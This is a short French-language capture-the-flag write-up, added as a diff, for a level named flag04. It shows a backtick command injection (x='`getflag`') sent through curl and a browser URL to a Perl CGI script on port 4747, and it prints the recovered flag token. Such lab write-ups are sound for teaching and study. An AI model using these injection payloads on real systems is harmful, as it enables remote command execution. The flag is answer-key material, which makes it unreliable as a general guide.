@@ -1,0 +1,27 @@
+flag04: getflag ne2searoevaevoem4ov4ar8ap
+
+https://yolospacehacker.com/hackersguide/fr/?cat=cmdinjection
+ls → level04.pl = script shell CGI
+A la requête du server sur localhost:4747 un script CGI est appelé = script exécuté par un serveur web (ex comme un script fastCGI qui génère des HTML depuis PHP pour le retourner au browser). 
+Le script CGI attend des paramètres. Pour passer des paramètre a une requete : ?x dans URL ou utilisation direct de perl
+Différents try : 
+curl 192.168.56.200?x='`getflag`' → (oubli du port)
+<html><body><h1>It works!</h1>
+<p>This is the default web page for this server.</p>
+<p>The web server software is running but no content has been added, yet.</p>
+</body></html>
+
+L’utilisation de perle exécute directement dans l’environnement donc ca ne marchera pas perl level04.pl x='`getflag`'
+Content-type: text/html
+
+Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
+
+Dans le browser
+http://192.168.56.200:4747/?x=`getflag` 
+On recupere le flag : ne2searoevaevoem4ov4ar8ap
+
+OU avec curl : 
+curl 192.168.56.200:4747?x='`getflag`'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+/usr/sbin/openarenaserver
+
